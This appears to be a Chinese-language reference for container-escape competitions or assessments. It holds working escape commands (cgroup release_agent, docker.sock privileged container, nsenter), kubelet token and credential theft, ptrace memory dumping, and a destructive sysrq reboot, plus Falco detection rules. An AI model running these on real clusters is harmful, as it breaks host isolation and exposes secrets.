# 容器运行时：runC / containerd / CRI-O 的差异与逃逸面

> 被 `competition-container-runtime` 引用。核心是**"声明态 vs 运行态"**：
> compose/YAML 说该怎样，不代表 /proc/self/status 和挂载表长成那样。
> 先读现场，再谈逃逸。

## 一、先认出运行时是哪一套

```bash
# 节点侧
crictl info | jq '.config.containerd.runtimes, .status.runtimeName'
systemctl status containerd crio docker --no-pager
ls -l /run/containerd/containerd.sock /run/crio/crio.sock /var/run/docker.sock

# 内核与版本
uname -a
cat /etc/os-release
runc --version            # 节点上
containerd --version
crio --version
```

| 运行时 | socket | CLI | CRI 实现 | 特点 |
| --- | --- | --- | --- | --- |
| containerd | `/run/containerd/containerd.sock` | `ctr` / `crictl` | 原生 | 默认 runc shim，可配 kata/gvisor |
| CRI-O | `/run/crio/crio.sock` | `crictl` / `crio` | 原生 | 更严格（默认 drop capabilities、只读 rootfs 倾向） |
| Docker (dockerd) | `/var/run/docker.sock` | `docker` | 通过 cri-dockerd | 老集群；socket 挂载 = 直接控制节点 |
| Podman | 无守护 socket | `podman` | 无 | rootless 默认，攻击面小 |

**判据**：能在 pod 内 `ls /run/containerd/containerd.sock` 说明 socket 被挂进来了；
这基本等于节点 root（见第四节）。

## 二、容器的"真实配置"从哪读

不要相信 YAML，直接读内核暴露的现场：

```bash
# 命名空间：跟宿主是否共享
ls -l /proc/self/ns/           # 对比 /proc/1/ns/ 与宿主（需宿主可见）
readlink /proc/self/ns/{pid,mnt,net,user,ipc,uts,cgroup}
cat /proc/1/cgroup             # cgroup v1 长路径 / v2 短路径，能看出 runtime 名

# capabilities：三组位图
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')
capsh --print

# seccomp / LSM
grep Seccomp /proc/self/status      # 2 = filter 模式
cat /proc/self/attr/current         # AppArmor: docker-default / SELinux: system_u:system_r:container_t:s0
cat /sys/kernel/security/lsm

# 挂载：找宿主目录
cat /proc/self/mountinfo | awk '{print $5, $9}' | sort -u | head -40
findmnt -R / | head -30
cat /proc/mounts | grep -E 'overlay|ext4|xfs|tmpfs'
```

**关键解析**：
- `CapEff` 里有 `cap_sys_admin` (bit 21) → 大量逃逸路径直接开
- `CapEff` 里有 `cap_dac_read_search` (bit 2) → 可绕过文件权限读宿主文件
- `/proc/self/mountinfo` 里出现 `/var/lib/docker`、`/var/lib/containerd`、
  `/var/lib/kubelet`、`/etc/kubernetes` 的源路径 → hostPath 挂载，重点看
- `Seccomp: 0` → 无过滤器，内核 CVE 可直接打

## 三、五种"配置型"逃逸（不需要内核漏洞）

### 3.1 privileged: true

```bash
# 判据：CapEff = 0000003fffffffff（全量）且 Seccomp=0，/dev 下能看到宿主设备
capsh --print | head -3
ls /dev | head -20

# 利用 1：直接挂宿主盘
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null || fdisk -l
ls /mnt/host

# 利用 2：cgroup release_agent（cgroup v1 有效）
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
hostpath=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts)
echo "$hostpath/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\ncat /etc/shadow > /tmp/out\n' > /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/out

# 利用 3：nsenter 进宿主（privileged + hostPID）
nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'id; hostname'
```

**注意 cgroup v2**：`release_agent` 已不存在，上面第 2 条在新内核上会失败（`mount: /tmp/cgrp: special device cgroup does not exist`）。
v2 下改用 `notify_on_release` + `cgroup.subtree_control` 的路径已失效，直接走 nsenter 或挂盘。

### 3.2 hostPath 挂载

```bash
# 找敏感挂载
cat /proc/self/mountinfo | grep -E '/(var/lib/(docker|containerd|kubelet)|etc/kubernetes|root|home)'

# /var/lib/kubelet → 读所有 pod 的 token 和 secrets
find /var/lib/kubelet/pods -name token -path '*serviceaccount*' 2>/dev/null | head
cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token 2>/dev/null | head -c 400

# /var/lib/docker → 直接读其它容器文件系统
ls /var/lib/docker/overlay2/ | head
grep -r "PRIVATE KEY" /var/lib/docker/volumes/ 2>/dev/null | head

# /etc/kubernetes → 直接拿 admin.conf
cat /etc/kubernetes/admin.conf | head -5
```

### 3.3 hostNetwork + hostPID

```bash
readlink /proc/self/ns/net   # 与宿主相同 → 看到宿主所有端口和 127.0.0.1 服务
ss -tlnp | head -20
readlink /proc/self/ns/pid   # 宿主 pid ns → ps 能看到全部进程
ps aux | head -20
```

hostPID 且 privileged 时，`nsenter -t 1 ...` 是最干净的落点。

### 3.4 Docker socket 挂载

```bash
ls -l /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# 起一个挂宿主根的容器 → 秒出
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],
       "HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
```

### 3.5 capabilities 逐项对应能力

| capability | bit | 直接能做什么 |
| --- | --- | --- |
| `CAP_SYS_ADMIN` | 21 | mount、unshare、cgroup、`setns`；几乎是"半个 root" |
| `CAP_SYS_PTRACE` | 19 | `ptrace` 附加宿主进程（同 pid ns）→ 读内存拿凭据 |
| `CAP_DAC_READ_SEARCH` | 2 | 绕过文件读权限；`open_by_handle_at` 可读宿主任意文件 |
| `CAP_DAC_OVERRIDE` | 1 | 绕过写权限 |
| `CAP_SYS_MODULE` | 16 | `insmod` 内核模块（最直接，但需模块签名策略允许） |
| `CAP_NET_ADMIN` | 12 | 改路由/iptables，可做流量劫持 |
| `CAP_NET_RAW` | 13 | raw socket，ARP 欺骗 |
| `CAP_SYS_CHROOT` | 18 | `chroot` 到挂载的宿主根 |
| `CAP_SETUID`/`CAP_SETGID` | 7/6 | 转任意 uid |
| `CAP_MKNOD` | 27 | 造块设备节点读宿主盘 |
| `CAP_SYS_BOOT` | 22 | `reboot()`（破坏性，红线） |

```bash
# DAC_READ_SEARCH + open_by_handle_at 的经典利用
# 需要先能 file_handle 到宿主文件（配合 /proc/<pid>/root 或挂载）
find / -xdev -type f -name '*.txt' 2>/dev/null | head   # 先定位

# SYS_PTRACE 直接读宿主进程内存（同 pid ns 时）
cat /proc/1/maps | head
gdb -p 1 -batch -ex 'generate-core-file /tmp/core' 2>/dev/null
strings /tmp/core | grep -iE 'password|token' | head
```

**注意**：默认 Docker 给的是 14 个 capability（不含 SYS_ADMIN/PTRACE/SYS_MODULE），
`--privileged` 才是全量。CRI-O 默认更少。别看到"有 capabilities"就以为能逃。

## 四、cgroup 逃逸

```bash
# 判断 v1 还是 v2
stat -fc %T /sys/fs/cgroup      # cgroup2fs = v2, tmpfs = v1
mount | grep cgroup

# v1：release_agent（上面 3.1 已给）
# v1：cgroup.procs 写 pid 到 root cgroup 可提升资源限制，但不直接逃逸

# v2：常见玩法是 cgroup namespace + /sys/fs/cgroup 可写
ls -ld /sys/fs/cgroup
touch /sys/fs/cgroup/test 2>&1      # 可写说明有危险
cat /sys/fs/cgroup/cgroup.controllers

# 通过 cgroup 观察宿主进程（信息泄露，不是逃逸）
ls /sys/fs/cgroup/*/ | head
```

**判据**：`/sys/fs/cgroup` 可写 + `CAP_SYS_ADMIN` + cgroup v1 = release_agent 可用。
v2 环境下这条路基本死了，别浪费时间。

## 五、/proc 与 /sys 逃逸

```bash
# /proc/sysrq-trigger（privileged 或 CAP_SYS_ADMIN 时可写）
echo b > /proc/sysrq-trigger       # 重启宿主 —— 破坏性，禁止在评估中用

# /proc/<pid>/root：同 pid ns 时能进宿主进程的根
ls /proc/1/root/                   # 看到宿主 / 说明同 mount ns 或有权限
cat /proc/1/root/etc/shadow

# /proc/<pid>/cwd 与 fd
ls -l /proc/1/cwd /proc/1/fd | head
cat /proc/1/environ | tr '\0' '\n' | grep -iE 'pass|token|key'

# /sys/kernel/uevent_helper（老内核，需 CAP_SYS_ADMIN + 内核 < 4.x 行为）
cat /proc/sys/kernel/hotplug
echo /tmp/x > /proc/sys/kernel/hotplug

# core_pattern（需 CAP_SYS_ADMIN，能指定管道程序 → 以 root 执行）
cat /proc/sys/kernel/core_pattern
echo '|/tmp/pwn %p' > /proc/sys/kernel/core_pattern
```

**注意**：`core_pattern` 写入在容器内通常被 seccomp 拦（`EPERM`），或者只影响本 ns。
这是"看起来能写其实无效"的典型。

## 六、检测视角

| 手法 | 日志/信号 | 具体特征 |
| --- | --- | --- |
| privileged 容器 | K8s audit / Falco | `privileged: true` 创建事件；Falco `Privileged Container Started` |
| hostPath 挂载 / | admission 日志 | `hostPath.path in ("/", "/etc", "/var/lib/kubelet")` |
| 挂宿主盘 | 宿主 auditd | `mount` 系统调用对 `/dev/sd*`、`/dev/nvme*` |
| docker.sock 访问 | 宿主 auditd 文件监控 | `/var/run/docker.sock` 的 `connect` |
| nsenter | Falco | `Nsenter Process Launched` / `Execve` 父进程是 `nsenter` |
| release_agent | auditd | 写 `/sys/fs/cgroup/**/release_agent` |
| core_pattern 改 | auditd | 写 `/proc/sys/kernel/core_pattern` |
| 读 /proc/1/root | Falco | `Read Sensitive File Untrusted`（`/etc/shadow`） |

Falco 规则示例（可直接落地）：

```yaml
- rule: Privileged Pod Escape Attempt
  condition: >
    spawned_process and container and
    (proc.name in (nsenter, mount, unshare) or
     fd.name startswith /proc/1/root or
     fd.name = /var/run/docker.sock)
  output: "Possible container escape (user=%user.name cmd=%proc.cmdline container=%container.id)"
  priority: CRITICAL
```

## 七、验伤信号

| 声称 | 硬证据 | 假成功反例 |
| --- | --- | --- |
| 逃到宿主 | `hostname` 变成节点名，`/etc/hostname` 是节点值，`ps` 看到 kubelet/containerd | 只是 `chroot` 进了另一个容器根 |
| 挂到宿主盘 | `mount` 成功且 `ls /mnt/host/etc/shadow` 有内容 | `mount` 报 `permission denied` 但命令退出码是 0（被 `\|\|` 吞了） |
| release_agent 生效 | `/tmp/out` 真出现内容 | 写了 `release_agent` 但 `cgroup.procs` 移动失败（v2 或权限不足） |
| docker.sock 控制 | `POST /containers/create` 返回 201 且容器真跑起来 | 200 但 `State.Running=false`（镜像拉不到） |
| ptrace 宿主进程 | `core` 文件里 strings 出明文凭据 | `ptrace: Operation not permitted`（Yama ptrace_scope=1） |

**必做的对偶检查**：逃逸前后各存一份 `hostname; cat /proc/self/cgroup; ls -l /proc/1/ns/pid`，
否则无法证明"边界真的被越过"，只能证明"命令返回了 0"。

## 八、常见坑

1. **cgroup v2 上套 v1 的 release_agent**。新发行版（Ubuntu 22.04+、Debian 12、RHEL 9）默认 v2，
   这条链直接死。先 `stat -fc %T /sys/fs/cgroup`。
2. **privileged 但 seccomp 仍拦 mount**。1.19+ 默认 seccomp runtime default，某些 syscall 被拒；
   要看容器是否显式 `seccompProfile: Unconfined`。
3. **hostPath 是只读**。`readOnly: true` 时能读不能写，很多"写入成功"其实是写进了 overlay 上层，
   宿主看不到。
4. **pod 里的 `/var/run/docker.sock` 是旧路径**。containerd 集群里是 `containerd.sock`，
   挂对了才有用；`/run/docker.sock` 存在但 `curl` 无响应说明是个空文件挂载。
5. **同一 pid ns 才能 nsenter -t 1**。没有 `hostPID` 时 `/proc/1` 是容器自己的 init，
   nsenter 进去还是容器。
6. **`chroot /host` 不等于宿主 root**。没有 `CAP_SYS_ADMIN` 时 chroot 完仍受限，
   要看后续能不能 `mount`、能不能读 `/host/etc/shadow`。